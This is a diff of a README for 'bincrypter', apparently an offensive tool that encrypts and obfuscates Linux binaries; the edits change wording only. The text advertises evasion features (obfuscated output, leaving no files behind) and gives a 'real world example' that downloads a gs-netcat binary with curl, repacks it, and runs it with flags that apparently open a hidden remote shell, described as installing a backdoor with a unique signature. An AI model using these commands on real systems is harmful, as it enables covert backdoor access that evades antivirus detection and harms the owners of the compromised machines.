@@ -7,8 +7,8 @@
 - Not soiling the filesystem
 - Can double or triple encrypt the same binary
 - Resulting binary is heavily obfuscated (`string` shows garbage)
-- Living off the Land: /bin/sh + perl + openssl
-- Architecture agnostic: Works on x86_64, aarch64, arm7, mips, ...
+- Living off the Land: Only needs /bin/sh + perl + openssl
+- Architecture agnostic: Works on x86_64, aarch64, arm6, mips, ...
 
 Download:
 ```shell
@@ -16,7 +16,7 @@ curl -SsfL https://github.com/hackerschoice/bincrypter/raw/refs/heads/main/bincr
 chmod +x bincrypter.sh
 ```
 
-Usage:
+Example:
 ```shell
 cp /usr/bin/id id
 ./bincrypter.sh id
@@ -39,9 +39,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Real world example (install a backdoor with a unique signature):
 ```shell
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | ./bincrypter.sh >gsnc
+curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter.sh >gsnc
 chmod +x gsnc
-GS_ARGS="-ilD -s ChangeMe" ./gsnc
+PASSWORD="foobar" GS_ARGS="-ilD -s ChangeMe" ./gsnc
 ```
 
 
